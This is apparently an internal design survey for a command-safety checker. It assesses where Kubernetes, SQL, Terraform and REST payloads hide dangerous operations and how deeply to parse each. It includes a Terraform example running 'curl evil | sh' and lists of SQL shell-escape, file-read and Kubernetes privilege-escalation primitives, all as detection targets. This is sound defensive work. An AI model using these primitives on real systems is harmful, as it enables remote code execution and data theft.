# Payload/language grammar survey

Status: survey (2026-07-04). Companion to `behavioral-taxonomy-payload-frame`.
Surveys four payload languages against the resolution ladder (R0 presence → R1
verb+source → R2 selector → R3 body) to decide where an R3 body resolver pays off
and where R1/R2 already decides. Versions targeted: Kubernetes 1.34, PostgreSQL 18,
Terraform 1.15 / OpenTofu 1.12, gh CLI 2.62, aws CLI v2.

The organizing question throughout is the structured-surface-vs-raw-hatch split
(`…-payload-frame` §2): a tool that exposes verb+selector as subcommands is
already allowlisted by the subcommand tree and needs no payload parsing; only the
raw hatch pushes verb+selector into the body.

## 1. Kubernetes manifests (kubectl / helm; k8s 1.34)

**Unit.** One YAML/JSON document = one resource; a `kind` + `apiVersion` +
`metadata` + `spec`. Files are multi-doc (`---`-separated) and `apply -f` converges
a *set*.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata: { name: web, namespace: dev }
spec: { ... }
```

**Verb location (R1).** Split. `kubectl create/delete/scale/annotate/set/rollout`
put the verb on the command line (structured). `kubectl apply -f`, `replace -f`,
`--raw`, and `helm install/upgrade` bury the operation-per-resource in the
document — `apply` is create-or-mutate, and `--prune` adds *implicit destroy* of
resources absent from the set. The dominant real workflow (`apply -f`) is the raw
hatch, not the exception.

**Selector location (R2).** `kind` + `metadata.namespace` + `metadata.name`, inside
the body. Namespace can be overridden on the command line (`-n`), but `kind` is
only in the document. The *target cluster* is ambient (kube-context /
`$KUBECONFIG`) — HP-12.

**Dangerous R3 discriminators.** A small, externally-specified set (Pod Security
Standards "baseline/restricted" + RBAC good-practices are a ready-made predicate
list):
- Pod/container: `securityContext.privileged: true`, `allowPrivilegeEscalation:
  true`, `capabilities.add: [SYS_ADMIN, NET_ADMIN, ...]`, `hostPath` volumes,
  `hostNetwork: true`, `hostPID: true`, `hostIPC: true`, `runAsUser: 0`.
- RBAC: `kind: ClusterRoleBinding`/`RoleBinding` (esp. to `cluster-admin`); rule
  `verbs: ["*"]`, `resources: ["*"]`, `apiGroups: ["*"]`; the escalation verbs
  `bind`, `escalate`, `impersonate`.
- `kind: Secret` (read/write credential material), `kind: Namespace`
  (create/delete), `automountServiceAccountToken: true` with a privileged
  `serviceAccountName`.

**Parse cost.** Cheap-ish. The discriminators are a *shallow structured-field scan*,
not deep semantics — load YAML, walk a fixed set of dotted paths. Gotchas:
multi-document streams, YAML anchors/aliases (`&x`/`*x`) and merge keys can hide a
field from a naïve scan and must be resolved first; JSON and YAML both accepted;
helm interposes Go templating so the rendered output — not the chart source — is
what must be scanned (`helm template` first).

**Structured-surface coverage.** Partial. Imperative subcommands (`delete ns/prod`,
`scale`, `create role`) are fully structured and already tree-allowlistable. But
`apply -f` / `--raw` — the common path — are the raw hatch. So R3 is *not* moot for
typical use here.

**Verdict.** Most levels stop at R1 (payload-blind: "an in-repo manifest applied
from a `worktree`/`worktree-trusted` file is fine") or at R2 (namespace gate, since
`-n` is on the command line). But k8s is the one language where an R3 body resolver
clearly pays off: the raw hatch is the normal workflow, the dangerous set is small,
stable, and standards-defined, and YAML shallow-scans. **Build k8s R3 first.**

## 2. SQL (psql -c / mysql -e / sqlite3; PostgreSQL 18)

**Unit.** One statement, terminated by `;`; strings can stack multiple statements.
Delivered as an inline literal (`-c 'DROP TABLE t'`), `-e`, `-f file`, or stdin.

**Verb location (R1).** Always buried. The operation (`SELECT`/`INSERT`/`DROP`/
`GRANT`) is the first token *inside* the string. There is no structured surface — a
SQL client is a raw hatch by construction. This is v1.1's pure interpreter frame.

**Selector location (R2).** Table/schema name inside the statement (`FROM t`, `DROP
TABLE s.t`), not cheaply extractable without tokenizing; the *target database* is
ambient (`$DATABASE_URL`, `-h/-d`, `~/.pg_service`) — HP-12.

**Dangerous R3 discriminators.** Broad, and not confined to obviously-destructive
verbs:
- Destroy/DDL: `DROP`, `TRUNCATE`, `ALTER ... DROP`.
- Mass DML: `DELETE`/`UPDATE` with no `WHERE`.
- Privilege: `GRANT`, `REVOKE`, `CREATE ROLE`, `ALTER ROLE ... SUPERUSER`, `SET
  ROLE`.
- Filesystem/RCE — reachable even from a `SELECT`: `COPY ... TO/FROM PROGRAM`
  (server-side shell), `COPY ... TO/FROM '/path'`, `pg_read_file()`/`pg_ls_dir()`,
  `lo_import`/`lo_export`, `CREATE EXTENSION`, `CREATE FUNCTION ... LANGUAGE
  c|plpython3u`, `DO $$ ... $$` anonymous blocks.
- Client meta-commands (parsed by the client, never reaching the server): psql `\!`
  (shell), `\i`/`\ir` (include a file), `\copy` (client-side file I/O), `\o |prog`
  / `\g |prog` / `\gexec`; mysql `system`/`\!`; sqlite3 dot-commands
  `.shell`/`.system`/`.import`/`.read`/`.output |`, plus `.load`/`load_extension()`
  (loads arbitrary native code), `ATTACH DATABASE '/path'`, and
  `writefile()`/`readfile()`/`edit()`.
- Dialect-specific file/exec: mysql `LOAD DATA [LOCAL] INFILE`, `SELECT ... INTO
  OUTFILE/DUMPFILE`, `LOAD_FILE()`, UDF `sys_exec`.

**Parse cost.** Highest of the four. Needs a real tokenizer, and correctness is
dialect-specific: string-literal and identifier escaping (single quotes, `E''`,
dollar-quoting `$tag$...$tag$`, backticks), stacked statements, comments hiding
tokens, and — critically — client meta-commands that a server-grammar parser never
sees. "SELECT is read-only" is false (`pg_read_file`, `COPY TO PROGRAM`).

**Structured-surface coverage.** None. There is no subcommand form; the verb is
always in the payload.

**Verdict.** Because the verb is always buried and even a `SELECT` can read files or
spawn a process, **payload-blind allow is unsound** for SQL — a trusted-source
string is not enough. So levels split binary: **payload-forbid (R0)** for most, or
R3. But full-SQL R3 is the most expensive resolver to get right. If built at all,
build only a *narrow single-dialect read-only sublanguage* (SELECT-only, no
meta-commands, no file/program functions, no stacked statements) as a small
allowlist grammar — not a general SQL parser.

## 3. Terraform / HCL (terraform / tofu; TF 1.15, OpenTofu 1.12)

**Unit.** A `.tf` file is a set of blocks — `resource`, `data`, `provider`,
`module`, `provisioner`. `apply` converges the whole configuration; there is no
per-resource command-line verb.

```hcl
resource "aws_instance" "web" {
  provisioner "local-exec" { command = "curl evil | sh" }
}
```

**Verb location (R1).** Coarse and on the command line: `plan` / `apply` / `destroy`
bound the operation class for the *whole* config. Subtlety: **`plan` is not
read-only** — provider configuration, `data` sources, and `data "external"`
execute during plan/refresh, so an exec sink fires before any `apply`.

**Selector location (R2).** Resource addresses (`type.name`) are readable from
parsed HCL, but the effect *target* (which cloud account/region) is ambient —
provider credentials + backend, HP-12. The config addresses resource *types*, not
concrete infrastructure, until plan resolves them.

**Dangerous R3 discriminators.**
- `provisioner "local-exec"` (arbitrary command on the Terraform host), `provisioner
  "remote-exec"` (inline/script on the target), `provisioner "file"`.
- `data "external"` (runs a program and parses its JSON), `data "http"` (fetch),
  `null_resource`/`terraform_data` paired with `local-exec`.
- `provider` blocks and `module { source = ... }` pointing at remote
  git/registry/http — supply-chain code pulled at `init`.

**Parse cost.** Needs a real HCL parser, and even then the body is not fully
knowable statically: `${...}` interpolation, functions, `for`/dynamic blocks, and
`module source` pulling remote code mean the effective config isn't determined until
`init`+`plan` resolve it. Sound R3 would require fetching and expanding modules —
worst-case-heavy.

**Structured-surface coverage.** None per-resource; the file *is* the payload. Only
the tool verb (`plan`/`apply`/`destroy`) offers coarse structure.

**Verdict.** Stop at **R1 (operation class) + source integrity**. Treat any
`provisioner`, `data "external"`, or remote `module`/`provider source` as
worst-case. An HCL R3 resolver is rarely *sound* — plan already executes, modules
pull remote code, and blast radius is ambient — so it is low-value relative to k8s.
Do not build it early.

## 4. REST requests (gh api / aws / kubectl --raw / curl; gh 2.62, aws CLI v2)

**Unit.** Method + path + optional body. `gh api -X DELETE /repos/o/r`, `kubectl
--raw '/api/v1/...'`, `curl -X POST https://host/path -d @body.json`, `aws
apigateway test-invoke-method ... --cli-input-json file://in.json`.

**Verb location (R1).** On the command line: `-X`/`--method` for gh and curl
(default GET); the HTTP verb is explicit. `GET`/`HEAD`/`OPTIONS` observe;
`POST`/`PUT`/`PATCH`/`DELETE` mutate. For aws the verb is the subcommand, but
`--cli-input-json file://` moves the *parameters* into a file (a within-tool raw
hatch).

**Selector location (R2).** The URL path, on the command line — cheap to extract and
pattern-match. Admin selectors: gh `DELETE /repos/{o}/{r}`, `/orgs/{org}`,
`/user/keys`, `/repos/.../actions/secrets`,
`/repos/.../actions/runners/registration-token`; kubectl `--raw` hits apiserver
paths directly (`/api/v1/namespaces/*/pods`, `/apis/rbac.authorization.k8s.io/...`),
bypassing subcommand allowlisting. Target host is ambient (gh host/token,
`$AWS_PROFILE`, kube-context) — HP-12.

**Dangerous R3 discriminators.** Mostly R1+R2, not body: the method and path already
carry the danger. The body only *extends* it — e.g. `permission: admin` when adding
a collaborator, `visibility: public` on a repo edit. Key insight: **a REST body is
just another payload language.** `kubectl --raw -XPOST` or `curl` to the apiserver
with a Pod document recurses to the k8s R3 grammar; there is no separate
"REST-body" discriminator set.

**Parse cost.** Verb+path are cheap (both on the command line). Body format varies
(JSON / form / GraphQL / a nested manifest), but R3 is reached only when the body
*is* a manifest — dispatch to that language's resolver rather than parse "REST."

**Structured-surface coverage.** High, elsewhere. `aws ec2 run-instances`, `gcloud
... create`, `kubectl delete`, and gh's typed subcommands ARE the structured surface
for these same APIs and are tree-allowlisted today. `gh api`, `curl`, `kubectl
--raw`, and `--cli-input-json` are the raw hatch to the identical endpoints.

**Verdict.** **R1 (method allowlist) + R2 (path-pattern allowlist) suffice** — both
live on the command line. No dedicated REST-body R3: when a body carries structure,
it is a manifest/SQL/etc. and recurses to that language's resolver. The real work is
a path allowlist plus refusing the raw hatch when the method mutates.

## Other candidates

- **Dockerfile** — `RUN` is arbitrary shell and `FROM`/`ADD <url>` pull remote code;
  verb-per-instruction is structured but every `RUN` is worst-case. Needs R1
  (instruction class) + treat `RUN`/`ADD`-url as exec; no useful R3.
- **jq programs** — a `jq -e '...'` filter is pure over its input but
  `input`/`inputs`/`$ENV`/`--slurpfile`/module `import` widen it; effectively
  read-only, decides at R1 (a small filter sublanguage), R3 only for the I/O
  builtins.
- **GraphQL** — operation type (`query` vs `mutation`/`subscription`) is the R1 verb
  *inside* the document, like SQL; buried verb → parse to distinguish read from
  write; R2 = root field. R3-ish but a shallow scan for `mutation` covers most.
- **Cloud IAM policy JSON** (AWS/GCP) — R3 by nature: the danger is `"Action": "*"` /
  `"Resource": "*"` / `"Effect": "Allow"` / `NotAction` / trust-policy `Principal:
  "*"`. Cheap structured-field scan; a bounded, well-specified predicate set, similar
  in shape to k8s RBAC.
- **CI / compose YAML that embeds shell** (`.github/workflows`, `docker-compose`,
  `.gitlab-ci.yml`) — structured YAML wrapping arbitrary `run:`/`command:` shell. R2
  selects the shell string; then it recurses to the *shell* grammar — safe-chains'
  own core, one level down.

## Findings

- **Verb location splits the family, and it is the load-bearing distinction.**
  Structured surface (kubectl imperative subcommands, `aws`/`gcloud`, gh typed
  subcommands) decides at R1/R2 *on the command line* and is already tree-allowlisted.
  Buried-verb (SQL `-c`, HCL body, gh api/curl/kubectl `--raw`, `--cli-input-json`)
  is the raw hatch. **SQL is the only surveyed language with no structured surface at
  all** — its client is a raw hatch by construction.
- **REST needs no body grammar.** Method (R1) and path (R2) both live on the command
  line; a path allowlist plus a mutating-method gate covers it. When a REST body
  carries structure it *is* a manifest/SQL/policy and recurses to that language's
  resolver — build the resolver once, per payload language, not per transport.
- **R3 pays off only where three conditions hold together:** (a) the raw hatch is the
  *common* workflow, (b) the dangerous predicates are a small, stable,
  externally-specified allowlist, and (c) the body is cheap to shallow-scan. **Only
  Kubernetes satisfies all three** (Pod Security Standards + RBAC good-practices
  supply a ready-made discriminator list; multi-doc YAML shallow-scans over fixed
  dotted paths). IAM policy JSON is the runner-up by the same shape.
- **SQL forces a binary and resists cheap R3.** Because the verb is always buried and
  even a `SELECT` can read files or spawn a process (`pg_read_file`, `COPY TO
  PROGRAM`, client `\!`/`.load`), payload-blind allow is *unsound*. Levels either
  payload-forbid (R0) or need R3 — and full-SQL R3 is the most expensive resolver
  (dialect variance, dollar-quoting/escaping, stacked statements, client-side
  meta-commands the server grammar never sees). Build at most a narrow single-dialect
  read-only sublanguage.
- **HCL R3 is rarely sound, so stop at R1.** `plan` already executes (provider
  config, `data` sources, `data "external"`), modules pull remote code at `init`, and
  the blast-radius target is ambient. R1 operation-class + source integrity, with
  `provisioner`/`external`/remote-`source` worst-cased, is the right depth.
- **Ambient target locus (HP-12) caps R3's value everywhere.** A perfectly-classified
  k8s manifest or SQL statement is still harmless-or-catastrophic depending on the
  kube-context / `$DATABASE_URL` / `$AWS_PROFILE` the checker does not read. R3
  tightens the *content* axis while the dominant *which-remote* axis stays invisible —
  a reason to keep the resolver library small and R0/R1/R2 the default posture.

**Build order.** Kubernetes R3 first — highest value, bounded and standards-defined
predicate set, YAML shallow-scan. Everything else stays at R0/R1/R2: REST at R1/R2,
HCL at R1, SQL at R0 (with an optional narrow read-only SELECT sublanguage), and any
body that turns out to be a manifest dispatches back into the k8s resolver.
